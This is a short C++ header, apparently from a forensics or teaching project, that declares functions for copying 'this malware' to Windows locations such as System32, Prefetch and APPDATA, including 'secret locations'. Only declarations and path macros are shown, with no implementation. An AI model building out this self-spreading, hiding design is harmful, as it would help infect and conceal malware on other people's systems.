// MIT License
//
// Copyright(c) 2017 ForensicTools
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files(the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions :
//
// The above copyright notice and this permission notice shall be included in 
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING 
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
// IN THE SOFTWARE.
//

// Authors:	Joseph Bartelmo   <joebartelmo@gmail.com>
//			Robert Suter      <rxs2165@g.rit.edu>
//			Andrew Botsehagow <abotschagow@gmail.com>
#pragma once
#include <vector>
#include <string>

//Just a few, feel free to define more
#define LOC_SYS32 "C:\\Windows\\System32"
#define LOC_PREFETCH "C:\\Windows\Prefetch"
#define LOC_PROGRAM_FILES "C:\\Program Files\\"
#define LOC_APPDATA "%APPDATA%\\"
#define LOC_TEMP "%APPDATA%\\Roaming\\Temp"

/// <summary>
/// Writes this malware to a target location
/// </summary>
/// <param name="char*">Location of malware</param>
/// <param name="char*">Target location to write the malware</param>
/// <returns>True on success</returns>
bool write_to_target(std::string, std::string);

/// <summary>
/// Writes this malware to a set of locations
/// </summary>
/// <param name="char*">Target location to write the malware</param>
/// <returns>List of locations malware was written to</returns>
std::vector<std::string> propegate_to_locations(std::string, 
	std::vector<std::string>);

/// <summary>
/// Writes this malware to a set of secret locations
/// </summary>
/// <param name="std::string">Location of Malware</param>
/// <returns>List of locations malware was written to</returns>
std::vector<std::string> propegate_to_secret_locations(std::string);
